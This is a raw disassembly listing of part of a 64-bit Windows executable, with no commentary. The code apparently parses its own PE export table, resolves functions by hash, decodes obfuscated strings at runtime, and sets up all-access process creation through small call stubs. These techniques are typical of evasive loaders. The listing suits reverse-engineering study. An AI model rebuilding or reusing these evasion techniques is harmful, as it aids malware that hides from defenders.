   140002569:	44 8b 4c 10 0c       	mov    0xc(%rax,%rdx,1),%r9d
   14000256e:	4c 39 c9             	cmp    %r9,%rcx
   140002571:	72 ed                	jb     0x140002560
   140002573:	44 03 4c 10 08       	add    0x8(%rax,%rdx,1),%r9d
   140002578:	4c 39 c9             	cmp    %r9,%rcx
   14000257b:	73 e3                	jae    0x140002560
   14000257d:	8b 44 10 24          	mov    0x24(%rax,%rdx,1),%eax
   140002581:	f7 d0                	not    %eax
   140002583:	c1 e8 1f             	shr    $0x1f,%eax
   140002586:	c3                   	ret
   140002587:	31 c0                	xor    %eax,%eax
   140002589:	c3                   	ret
   14000258a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002590:	56                   	push   %rsi
   140002591:	48 8b 15 70 1a 01 00 	mov    0x11a70(%rip),%rdx        # 0x140014008
   140002598:	0f b7 02             	movzwl (%rdx),%eax
   14000259b:	3d 4d 5a 00 00       	cmp    $0x5a4d,%eax
   1400025a0:	0f 85 87 00 00 00    	jne    0x14000262d
   1400025a6:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   1400025aa:	81 3c 02 50 45 00 00 	cmpl   $0x4550,(%rdx,%rax,1)
   1400025b1:	75 7a                	jne    0x14000262d
   1400025b3:	48 01 d0             	add    %rdx,%rax
   1400025b6:	44 0f b7 40 18       	movzwl 0x18(%rax),%r8d
   1400025bb:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   1400025c2:	75 69                	jne    0x14000262d
   1400025c4:	44 8b 80 90 00 00 00 	mov    0x90(%rax),%r8d
   1400025cb:	4d 85 c0             	test   %r8,%r8
   1400025ce:	74 5d                	je     0x14000262d
   1400025d0:	44 0f b7 48 06       	movzwl 0x6(%rax),%r9d
   1400025d5:	4d 85 c9             	test   %r9,%r9
   1400025d8:	74 53                	je     0x14000262d
   1400025da:	44 0f b7 50 14       	movzwl 0x14(%rax),%r10d
   1400025df:	49 c1 e1 03          	shl    $0x3,%r9
   1400025e3:	4f 8d 0c 89          	lea    (%r9,%r9,4),%r9
   1400025e7:	49 01 c2             	add    %rax,%r10
   1400025ea:	49 83 c2 24          	add    $0x24,%r10
   1400025ee:	31 c0                	xor    %eax,%eax
   1400025f0:	45 31 db             	xor    %r11d,%r11d
   1400025f3:	eb 14                	jmp    0x140002609
   1400025f5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400025fc:	00 00 00 00 
   140002600:	49 83 c3 28          	add    $0x28,%r11
   140002604:	45 39 d9             	cmp    %r11d,%r9d
   140002607:	74 26                	je     0x14000262f
   140002609:	43 8b 34 1a          	mov    (%r10,%r11,1),%esi
   14000260d:	44 39 c6             	cmp    %r8d,%esi
   140002610:	77 ee                	ja     0x140002600
   140002612:	43 03 74 1a fc       	add    -0x4(%r10,%r11,1),%esi
   140002617:	44 39 c6             	cmp    %r8d,%esi
   14000261a:	76 e4                	jbe    0x140002600
   14000261c:	4c 01 c2             	add    %r8,%rdx
   14000261f:	48 83 c2 0c          	add    $0xc,%rdx
   140002623:	31 c0                	xor    %eax,%eax
   140002625:	83 7a f8 00          	cmpl   $0x0,-0x8(%rdx)
   140002629:	75 26                	jne    0x140002651
   14000262b:	eb 1f                	jmp    0x14000264c
   14000262d:	31 c0                	xor    %eax,%eax
   14000262f:	5e                   	pop    %rsi
   140002630:	c3                   	ret
   140002631:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140002638:	0f 1f 84 00 00 00 00 
   14000263f:	00 
   140002640:	ff c9                	dec    %ecx
   140002642:	48 83 c2 14          	add    $0x14,%rdx
   140002646:	83 7a f8 00          	cmpl   $0x0,-0x8(%rdx)
   14000264a:	75 05                	jne    0x140002651
   14000264c:	83 3a 00             	cmpl   $0x0,(%rdx)
   14000264f:	74 de                	je     0x14000262f
   140002651:	85 c9                	test   %ecx,%ecx
   140002653:	7f eb                	jg     0x140002640
   140002655:	8b 02                	mov    (%rdx),%eax
   140002657:	48 03 05 aa 19 01 00 	add    0x119aa(%rip),%rax        # 0x140014008
   14000265e:	eb cf                	jmp    0x14000262f
   140002660:	51                   	push   %rcx
   140002661:	50                   	push   %rax
   140002662:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002668:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   14000266d:	72 18                	jb     0x140002687
   14000266f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140002676:	48 85 09             	test   %rcx,(%rcx)
   140002679:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   14000267f:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002685:	77 e8                	ja     0x14000266f
   140002687:	48 29 c1             	sub    %rax,%rcx
   14000268a:	48 85 09             	test   %rcx,(%rcx)
   14000268d:	58                   	pop    %rax
   14000268e:	59                   	pop    %rcx
   14000268f:	c3                   	ret
   140002690:	41 57                	push   %r15
   140002692:	41 56                	push   %r14
   140002694:	41 55                	push   %r13
   140002696:	41 54                	push   %r12
   140002698:	56                   	push   %rsi
   140002699:	57                   	push   %rdi
   14000269a:	55                   	push   %rbp
   14000269b:	53                   	push   %rbx
   14000269c:	48 81 ec 58 03 00 00 	sub    $0x358,%rsp
   1400026a3:	0f 29 b4 24 40 03 00 	movaps %xmm6,0x340(%rsp)
   1400026aa:	00 
   1400026ab:	4d 89 ce             	mov    %r9,%r14
   1400026ae:	4c 89 c3             	mov    %r8,%rbx
   1400026b1:	49 89 d7             	mov    %rdx,%r15
   1400026b4:	48 89 8c 24 c0 00 00 	mov    %rcx,0xc0(%rsp)
   1400026bb:	00 
   1400026bc:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   1400026c3:	00 00 
   1400026c5:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   1400026cc:	00 00 
   1400026ce:	48 c7 84 24 d0 00 00 	movq   $0x0,0xd0(%rsp)
   1400026d5:	00 00 00 00 00 
   1400026da:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   1400026e1:	00 00 00 00 00 
   1400026e6:	4c 8d 8c 24 98 00 00 	lea    0x98(%rsp),%r9
   1400026ed:	00 
   1400026ee:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400026f3:	31 d2                	xor    %edx,%edx
   1400026f5:	45 31 c0             	xor    %r8d,%r8d
   1400026f8:	e8 60 ee ff ff       	call   0x14000155d
   1400026fd:	85 c0                	test   %eax,%eax
   1400026ff:	0f 88 ef 00 00 00    	js     0x1400027f4
   140002705:	48 8b 3c 25 40 00 00 	mov    0x40,%rdi
   14000270c:	00 
   14000270d:	80 3d 1b b6 50 00 00 	cmpb   $0x0,0x50b61b(%rip)        # 0x14050dd2f
   140002714:	0f 84 0d 06 00 00    	je     0x140002d27
   14000271a:	48 8d b4 24 38 01 00 	lea    0x138(%rsp),%rsi
   140002721:	00 
   140002722:	80 3d d1 b7 50 00 00 	cmpb   $0x0,0x50b7d1(%rip)        # 0x14050defa
   140002729:	74 5a                	je     0x140002785
   14000272b:	66 0f 6f 05 ad b7 50 	movdqa 0x50b7ad(%rip),%xmm0        # 0x14050dee0
   140002732:	00 
   140002733:	66 0f fd 05 25 1e 01 	paddw  0x11e25(%rip),%xmm0        # 0x140014560
   14000273a:	00 
   14000273b:	66 0f db 05 2d 1e 01 	pand   0x11e2d(%rip),%xmm0        # 0x140014570
   140002742:	00 
   140002743:	66 0f 7f 05 95 b7 50 	movdqa %xmm0,0x50b795(%rip)        # 0x14050dee0
   14000274a:	00 
   14000274b:	f3 0f 7e 05 9d b7 50 	movq   0x50b79d(%rip),%xmm0        # 0x14050def0
   140002752:	00 
   140002753:	66 0f fd 05 25 1e 01 	paddw  0x11e25(%rip),%xmm0        # 0x140014580
   14000275a:	00 
   14000275b:	66 0f db 05 2d 1e 01 	pand   0x11e2d(%rip),%xmm0        # 0x140014590
   140002762:	00 
   140002763:	66 0f d6 05 85 b7 50 	movq   %xmm0,0x50b785(%rip)        # 0x14050def0
   14000276a:	00 
   14000276b:	8b 05 87 b7 50 00    	mov    0x50b787(%rip),%eax        # 0x14050def8
   140002771:	83 c0 2d             	add    $0x2d,%eax
   140002774:	0f b6 c0             	movzbl %al,%eax
   140002777:	66 89 05 7a b7 50 00 	mov    %ax,0x50b77a(%rip)        # 0x14050def8
   14000277e:	c6 05 75 b7 50 00 00 	movb   $0x0,0x50b775(%rip)        # 0x14050defa
   140002785:	48 8d 15 54 b7 50 00 	lea    0x50b754(%rip),%rdx        # 0x14050dee0
   14000278c:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140002792:	48 89 f9             	mov    %rdi,%rcx
   140002795:	e8 16 08 01 00       	call   0x140012fb0
   14000279a:	c7 84 24 30 01 00 00 	movl   $0x30,0x130(%rsp)
   1400027a1:	30 00 00 00 
   1400027a5:	66 0f ef c0          	pxor   %xmm0,%xmm0
   1400027a9:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   1400027ad:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%rsi)
   1400027b4:	f3 0f 7f 46 18       	movdqu %xmm0,0x18(%rsi)
   1400027b9:	48 8b 04 25 50 00 00 	mov    0x50,%rax
   1400027c0:	00 
   1400027c1:	48 89 84 24 d8 00 00 	mov    %rax,0xd8(%rsp)
   1400027c8:	00 
   1400027c9:	48 c7 84 24 e0 00 00 	movq   $0x0,0xe0(%rsp)
   1400027d0:	00 00 00 00 00 
   1400027d5:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400027da:	4c 8d 84 24 30 01 00 	lea    0x130(%rsp),%r8
   1400027e1:	00 
   1400027e2:	4c 8d 8c 24 d8 00 00 	lea    0xd8(%rsp),%r9
   1400027e9:	00 
   1400027ea:	ba 80 00 00 00       	mov    $0x80,%edx
   1400027ef:	e8 f1 ec ff ff       	call   0x1400014e5
   1400027f4:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   1400027fb:	00 
   1400027fc:	4c 8d 84 24 98 00 00 	lea    0x98(%rsp),%r8
   140002803:	00 
   140002804:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000280b:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002811:	e8 b1 ec ff ff       	call   0x1400014c7
   140002816:	48 83 7c 24 58 00    	cmpq   $0x0,0x58(%rsp)
   14000281c:	75 09                	jne    0x140002827
   14000281e:	48 c7 44 24 58 ff ff 	movq   $0xffffffffffffffff,0x58(%rsp)
   140002825:	ff ff 
   140002827:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   14000282c:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002833:	ba 03 00 00 00       	mov    $0x3,%edx
   140002838:	e8 c6 ec ff ff       	call   0x140001503
   14000283d:	b9 9f af 7c 2b       	mov    $0x2b7caf9f,%ecx
   140002842:	e8 e9 01 01 00       	call   0x140012a30
   140002847:	89 c0                	mov    %eax,%eax
   140002849:	65 48 8b 00          	mov    %gs:(%rax),%rax
   14000284d:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140002854:	00 
   140002855:	48 8d 8c 24 30 01 00 	lea    0x130(%rsp),%rcx
   14000285c:	00 
   14000285d:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140002863:	31 d2                	xor    %edx,%edx
   140002865:	e8 26 08 01 00       	call   0x140013090
   14000286a:	80 3d bf b4 50 00 00 	cmpb   $0x0,0x50b4bf(%rip)        # 0x14050dd30
   140002871:	0f 84 6a 04 00 00    	je     0x140002ce1
   140002877:	80 3d 8c b6 50 00 00 	cmpb   $0x0,0x50b68c(%rip)        # 0x14050df0a
   14000287e:	74 3c                	je     0x1400028bc
   140002880:	f3 0f 7e 05 78 b6 50 	movq   0x50b678(%rip),%xmm0        # 0x14050df00
   140002887:	00 
   140002888:	66 0f fd 05 10 1d 01 	paddw  0x11d10(%rip),%xmm0        # 0x1400145a0
   14000288f:	00 
   140002890:	66 0f db 05 f8 1c 01 	pand   0x11cf8(%rip),%xmm0        # 0x140014590
   140002897:	00 
   140002898:	66 0f d6 05 60 b6 50 	movq   %xmm0,0x50b660(%rip)        # 0x14050df00
   14000289f:	00 
   1400028a0:	b8 bf 00 00 00       	mov    $0xbf,%eax
   1400028a5:	03 05 5d b6 50 00    	add    0x50b65d(%rip),%eax        # 0x14050df08
   1400028ab:	0f b6 c0             	movzbl %al,%eax
   1400028ae:	66 89 05 53 b6 50 00 	mov    %ax,0x50b653(%rip)        # 0x14050df08
   1400028b5:	c6 05 4e b6 50 00 00 	movb   $0x0,0x50b64e(%rip)        # 0x14050df0a
   1400028bc:	48 8d 15 3d b6 50 00 	lea    0x50b63d(%rip),%rdx        # 0x14050df00
   1400028c3:	48 8d b4 24 30 01 00 	lea    0x130(%rsp),%rsi
   1400028ca:	00 
   1400028cb:	48 89 f1             	mov    %rsi,%rcx
   1400028ce:	e8 bd 06 01 00       	call   0x140012f90
   1400028d3:	48 89 f1             	mov    %rsi,%rcx
   1400028d6:	4c 89 fa             	mov    %r15,%rdx
   1400028d9:	e8 a2 06 01 00       	call   0x140012f80
   1400028de:	48 89 f1             	mov    %rsi,%rcx
   1400028e1:	e8 ba 06 01 00       	call   0x140012fa0
   1400028e6:	49 89 c7             	mov    %rax,%r15
   1400028e9:	4d 85 f6             	test   %r14,%r14
   1400028ec:	74 2c                	je     0x14000291a
   1400028ee:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   1400028f3:	4c 89 f1             	mov    %r14,%rcx
   1400028f6:	e8 a5 06 01 00       	call   0x140012fa0
   1400028fb:	48 8d 0c 45 02 00 00 	lea    0x2(,%rax,2),%rcx
   140002902:	00 
   140002903:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140002908:	48 b9 00 00 0b 08 e0 	movabs $0x6ede64e0080b0000,%rcx
   14000290f:	64 de 6e 
   140002912:	4c 8d 24 41          	lea    (%rcx,%rax,2),%r12
   140002916:	31 ff                	xor    %edi,%edi
   140002918:	eb 35                	jmp    0x14000294f
   14000291a:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140002921:	00 
   140002922:	48 8b 40 20          	mov    0x20(%rax),%rax
   140002926:	48 8b 48 38          	mov    0x38(%rax),%rcx
   14000292a:	48 8b 40 40          	mov    0x40(%rax),%rax
   14000292e:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002933:	48 89 c8             	mov    %rcx,%rax
   140002936:	48 c1 e8 10          	shr    $0x10,%rax
   14000293a:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000293f:	48 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%rdi
   140002946:	ff ff ff 
   140002949:	49 89 cc             	mov    %rcx,%r12
   14000294c:	48 21 cf             	and    %rcx,%rdi
   14000294f:	48 8b 8c 24 c0 03 00 	mov    0x3c0(%rsp),%rcx
   140002956:	00 
   140002957:	4e 8d 34 7d 02 00 00 	lea    0x2(,%r15,2),%r14
   14000295e:	00 
   14000295f:	4d 01 ff             	add    %r15,%r15
   140002962:	48 85 db             	test   %rbx,%rbx
   140002965:	74 1e                	je     0x140002985
   140002967:	48 89 ce             	mov    %rcx,%rsi
   14000296a:	48 89 d9             	mov    %rbx,%rcx
   14000296d:	e8 2e 06 01 00       	call   0x140012fa0
   140002972:	48 89 f1             	mov    %rsi,%rcx
   140002975:	49 89 c5             	mov    %rax,%r13
   140002978:	48 8d 2c 45 02 00 00 	lea    0x2(,%rax,2),%rbp
   14000297f:	00 
   140002980:	49 01 c5             	add    %rax,%r13
   140002983:	eb 0f                	jmp    0x140002994
   140002985:	44 89 f5             	mov    %r14d,%ebp
   140002988:	81 e5 fe ff 00 00    	and    $0xfffe,%ebp
   14000298e:	48 89 f3             	mov    %rsi,%rbx
   140002991:	4d 89 fd             	mov    %r15,%r13
   140002994:	48 89 9c 24 b8 00 00 	mov    %rbx,0xb8(%rsp)
   14000299b:	00 
   14000299c:	48 85 c9             	test   %rcx,%rcx
   14000299f:	75 38                	jne    0x1400029d9
   1400029a1:	80 3d 89 b3 50 00 00 	cmpb   $0x0,0x50b389(%rip)        # 0x14050dd31
   1400029a8:	0f 84 c2 03 00 00    	je     0x140002d70
   1400029ae:	48 8d 0d 57 b5 50 00 	lea    0x50b557(%rip),%rcx        # 0x14050df0c
   1400029b5:	80 3d 52 b5 50 00 00 	cmpb   $0x0,0x50b552(%rip)        # 0x14050df0e
   1400029bc:	74 1b                	je     0x1400029d9
   1400029be:	0f b7 05 47 b5 50 00 	movzwl 0x50b547(%rip),%eax        # 0x14050df0c
   1400029c5:	83 c0 39             	add    $0x39,%eax
   1400029c8:	0f b6 c0             	movzbl %al,%eax
   1400029cb:	66 89 05 3a b5 50 00 	mov    %ax,0x50b53a(%rip)        # 0x14050df0c
   1400029d2:	c6 05 35 b5 50 00 00 	movb   $0x0,0x50b535(%rip)        # 0x14050df0e
   1400029d9:	41 81 e5 fe ff 00 00 	and    $0xfffe,%r13d
   1400029e0:	48 89 8c 24 b0 00 00 	mov    %rcx,0xb0(%rsp)
   1400029e7:	00 
   1400029e8:	e8 b3 05 01 00       	call   0x140012fa0
   1400029ed:	48 89 c3             	mov    %rax,%rbx
   1400029f0:	01 c0                	add    %eax,%eax
   1400029f2:	41 0f b7 f4          	movzwl %r12w,%esi
   1400029f6:	41 81 e7 fe ff 00 00 	and    $0xfffe,%r15d
   1400029fd:	4c 89 bc 24 a0 00 00 	mov    %r15,0xa0(%rsp)
   140002a04:	00 
   140002a05:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140002a0c:	00 
   140002a0d:	49 8b 4c 24 20       	mov    0x20(%r12),%rcx
   140002a12:	0f b7 49 50          	movzwl 0x50(%rcx),%ecx
   140002a16:	0f b7 d0             	movzwl %ax,%edx
   140002a19:	48 89 94 24 a8 00 00 	mov    %rdx,0xa8(%rsp)
   140002a20:	00 
   140002a21:	4a 8d 04 2e          	lea    (%rsi,%r13,1),%rax
   140002a25:	4c 01 f8             	add    %r15,%rax
   140002a28:	48 01 d1             	add    %rdx,%rcx
   140002a2b:	4c 8d 3c 08          	lea    (%rax,%rcx,1),%r15
   140002a2f:	49 81 c7 16 04 00 00 	add    $0x416,%r15
   140002a36:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   140002a3d:	00 00 
   140002a3f:	4c 89 bc 24 90 00 00 	mov    %r15,0x90(%rsp)
   140002a46:	00 
   140002a47:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002a4e:	00 
   140002a4f:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140002a56:	00 
   140002a57:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002a5c:	4c 8d 8c 24 90 00 00 	lea    0x90(%rsp),%r9
   140002a63:	00 
   140002a64:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002a6b:	45 31 c0             	xor    %r8d,%r8d
   140002a6e:	e8 36 ea ff ff       	call   0x1400014a9
   140002a73:	4c 89 e1             	mov    %r12,%rcx
   140002a76:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140002a7b:	45 89 3c 24          	mov    %r15d,(%r12)
   140002a7f:	45 89 7c 24 04       	mov    %r15d,0x4(%r12)
   140002a84:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140002a89:	c1 e0 10             	shl    $0x10,%eax
   140002a8c:	48 09 c7             	or     %rax,%rdi
   140002a8f:	48 09 f7             	or     %rsi,%rdi
   140002a92:	41 c7 44 24 08 01 00 	movl   $0x1,0x8(%r12)
   140002a99:	00 00 
   140002a9b:	49 c7 44 24 10 fd ff 	movq   $0xfffffffffffffffd,0x10(%r12)
   140002aa2:	ff ff 
   140002aa4:	49 89 7c 24 38       	mov    %rdi,0x38(%r12)
   140002aa9:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140002aae:	49 89 44 24 40       	mov    %rax,0x40(%r12)
   140002ab3:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002ab7:	0f 10 40 50          	movups 0x50(%rax),%xmm0
   140002abb:	41 0f 11 44 24 50    	movups %xmm0,0x50(%r12)
   140002ac1:	41 83 e6 fe          	and    $0xfffffffe,%r14d
   140002ac5:	41 c1 e6 10          	shl    $0x10,%r14d
   140002ac9:	4c 8b bc 24 a0 00 00 	mov    0xa0(%rsp),%r15
   140002ad0:	00 
   140002ad1:	4d 09 fe             	or     %r15,%r14
   140002ad4:	4d 89 74 24 60       	mov    %r14,0x60(%r12)
   140002ad9:	c1 e5 10             	shl    $0x10,%ebp
   140002adc:	4c 09 ed             	or     %r13,%rbp
   140002adf:	48 8d bc 24 30 01 00 	lea    0x130(%rsp),%rdi
   140002ae6:	00 
   140002ae7:	49 89 7c 24 68       	mov    %rdi,0x68(%r12)
   140002aec:	49 89 6c 24 70       	mov    %rbp,0x70(%r12)
   140002af1:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   140002af8:	00 
   140002af9:	49 89 44 24 78       	mov    %rax,0x78(%r12)
   140002afe:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002b02:	48 8b 80 80 00 00 00 	mov    0x80(%rax),%rax
   140002b09:	49 89 84 24 80 00 00 	mov    %rax,0x80(%r12)
   140002b10:	00 
   140002b11:	c1 e3 11             	shl    $0x11,%ebx
   140002b14:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   140002b1b:	00 
   140002b1c:	01 d8                	add    %ebx,%eax
   140002b1e:	05 00 00 02 00       	add    $0x20000,%eax
   140002b23:	49 89 84 24 d0 00 00 	mov    %rax,0xd0(%r12)
   140002b2a:	00 
   140002b2b:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   140002b32:	00 
   140002b33:	49 89 84 24 d8 00 00 	mov    %rax,0xd8(%r12)
   140002b3a:	00 
   140002b3b:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002b3f:	48 8b 80 f0 03 00 00 	mov    0x3f0(%rax),%rax
   140002b46:	49 89 84 24 f0 03 00 	mov    %rax,0x3f0(%r12)
   140002b4d:	00 
   140002b4e:	0f 57 f6             	xorps  %xmm6,%xmm6
   140002b51:	0f 11 b4 24 20 01 00 	movups %xmm6,0x120(%rsp)
   140002b58:	00 
   140002b59:	0f 11 b4 24 10 01 00 	movups %xmm6,0x110(%rsp)
   140002b60:	00 
   140002b61:	0f 11 b4 24 00 01 00 	movups %xmm6,0x100(%rsp)
   140002b68:	00 
   140002b69:	0f 11 b4 24 f0 00 00 	movups %xmm6,0xf0(%rsp)
   140002b70:	00 
   140002b71:	0f 11 b4 24 e0 00 00 	movups %xmm6,0xe0(%rsp)
   140002b78:	00 
   140002b79:	48 c7 84 24 d8 00 00 	movq   $0x58,0xd8(%rsp)
   140002b80:	00 58 00 00 00 
   140002b85:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   140002b8c:	00 00 00 00 00 
   140002b91:	48 c7 84 24 c8 00 00 	movq   $0x60,0xc8(%rsp)
   140002b98:	00 60 00 00 00 
   140002b9d:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002ba4:	00 
   140002ba5:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140002bac:	00 
   140002bad:	48 8d 9c 24 88 00 00 	lea    0x88(%rsp),%rbx
   140002bb4:	00 
   140002bb5:	48 8d b4 24 c8 00 00 	lea    0xc8(%rsp),%rsi
   140002bbc:	00 
   140002bbd:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002bc4:	48 89 da             	mov    %rbx,%rdx
   140002bc7:	45 31 c0             	xor    %r8d,%r8d
   140002bca:	49 89 f1             	mov    %rsi,%r9
   140002bcd:	e8 d7 e8 ff ff       	call   0x1400014a9
   140002bd2:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140002bd9:	00 
   140002bda:	48 c7 00 68 00 00 00 	movq   $0x68,(%rax)
   140002be1:	48 c7 40 08 05 00 02 	movq   $0x20005,0x8(%rax)
   140002be8:	00 
   140002be9:	4c 89 78 10          	mov    %r15,0x10(%rax)
   140002bed:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140002bf1:	48 c7 40 28 00 00 06 	movq   $0x60000,0x28(%rax)
   140002bf8:	00 
   140002bf9:	48 c7 40 30 08 00 00 	movq   $0x8,0x30(%rax)
   140002c00:	00 
   140002c01:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140002c06:	48 89 48 38          	mov    %rcx,0x38(%rax)
   140002c0a:	48 c7 40 48 02 00 06 	movq   $0x60002,0x48(%rax)
   140002c11:	00 
   140002c12:	48 c7 40 50 08 00 00 	movq   $0x8,0x50(%rax)
   140002c19:	00 
   140002c1a:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002c1f:	48 89 48 58          	mov    %rcx,0x58(%rax)
   140002c23:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   140002c2a:	00 
   140002c2b:	0f 11 31             	movups %xmm6,(%rcx)
   140002c2e:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140002c35:	00 
   140002c36:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   140002c3a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002c3f:	48 8d 84 24 d8 00 00 	lea    0xd8(%rsp),%rax
   140002c46:	00 
   140002c47:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002c4c:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140002c51:	8b 84 24 c8 03 00 00 	mov    0x3c8(%rsp),%eax
   140002c58:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140002c5c:	0f 11 74 24 20       	movups %xmm6,0x20(%rsp)
   140002c61:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140002c68:	00 
   140002c69:	41 b8 ff ff 1f 00    	mov    $0x1fffff,%r8d
   140002c6f:	41 b9 ff ff 1f 00    	mov    $0x1fffff,%r9d
   140002c75:	e8 7a e8 ff ff       	call   0x1400014f4
   140002c7a:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002c81:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002c86:	4c 8d 84 24 90 00 00 	lea    0x90(%rsp),%r8
   140002c8d:	00 
   140002c8e:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002c94:	e8 2e e8 ff ff       	call   0x1400014c7
   140002c99:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002ca0:	48 89 da             	mov    %rbx,%rdx
   140002ca3:	49 89 f0             	mov    %rsi,%r8
   140002ca6:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002cac:	e8 16 e8 ff ff       	call   0x1400014c7
   140002cb1:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002cb6:	e8 a3 e7 ff ff       	call   0x14000145e
   140002cbb:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140002cc0:	e8 99 e7 ff ff       	call   0x14000145e
   140002cc5:	0f 28 b4 24 40 03 00 	movaps 0x340(%rsp),%xmm6
   140002ccc:	00 
   140002ccd:	48 81 c4 58 03 00 00 	add    $0x358,%rsp
   140002cd4:	5b                   	pop    %rbx
   140002cd5:	5d                   	pop    %rbp
   140002cd6:	5f                   	pop    %rdi
   140002cd7:	5e                   	pop    %rsi
   140002cd8:	41 5c                	pop    %r12
   140002cda:	41 5d                	pop    %r13
   140002cdc:	41 5e                	pop    %r14
   140002cde:	41 5f                	pop    %r15
   140002ce0:	c3                   	ret
   140002ce1:	c6 05 22 b2 50 00 01 	movb   $0x1,0x50b222(%rip)        # 0x14050df0a
   140002ce8:	48 b8 9d 00 80 00 80 	movabs $0x9d00800080009d,%rax
   140002cef:	00 9d 00 
   140002cf2:	48 89 05 07 b2 50 00 	mov    %rax,0x50b207(%rip)        # 0x14050df00
   140002cf9:	66 c7 05 06 b2 50 00 	movw   $0x41,0x50b206(%rip)        # 0x14050df08
   140002d00:	41 00 
   140002d02:	48 8d 0d b7 00 00 00 	lea    0xb7(%rip),%rcx        # 0x140002dc0
   140002d09:	e8 62 e6 ff ff       	call   0x140001370
   140002d0e:	c6 05 1b b0 50 00 01 	movb   $0x1,0x50b01b(%rip)        # 0x14050dd30
   140002d15:	80 3d ee b1 50 00 00 	cmpb   $0x0,0x50b1ee(%rip)        # 0x14050df0a
   140002d1c:	0f 85 5e fb ff ff    	jne    0x140002880
   140002d22:	e9 95 fb ff ff       	jmp    0x1400028bc
   140002d27:	c6 05 cc b1 50 00 01 	movb   $0x1,0x50b1cc(%rip)        # 0x14050defa
   140002d2e:	66 0f 6f 05 1a 18 01 	movdqa 0x1181a(%rip),%xmm0        # 0x140014550
   140002d35:	00 
   140002d36:	66 0f 7f 05 a2 b1 50 	movdqa %xmm0,0x50b1a2(%rip)        # 0x14050dee0
   140002d3d:	00 
   140002d3e:	48 b8 01 00 38 00 4b 	movabs $0x38004b00380001,%rax
   140002d45:	00 38 00 
   140002d48:	48 89 05 a1 b1 50 00 	mov    %rax,0x50b1a1(%rip)        # 0x14050def0
   140002d4f:	66 c7 05 a0 b1 50 00 	movw   $0xd3,0x50b1a0(%rip)        # 0x14050def8
   140002d56:	d3 00 
   140002d58:	48 8d 0d 41 00 00 00 	lea    0x41(%rip),%rcx        # 0x140002da0
   140002d5f:	e8 0c e6 ff ff       	call   0x140001370
   140002d64:	c6 05 c4 af 50 00 01 	movb   $0x1,0x50afc4(%rip)        # 0x14050dd2f
